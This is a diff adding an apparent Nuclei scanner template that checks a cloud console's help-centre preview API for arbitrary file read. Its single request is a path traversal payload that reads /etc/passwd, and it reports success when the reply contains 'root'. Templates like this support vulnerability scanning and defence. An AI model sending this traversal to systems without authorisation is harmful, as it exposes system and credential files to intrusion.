@@ -1,0 +1,24 @@
+id: cmecloud-console-readfile
+
+info:
+  name: 移动云控制台存在任意文件读取
+  author: onewin
+  severity: high
+  description: 移动云控制台存在任意文件读取
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
+        part: body
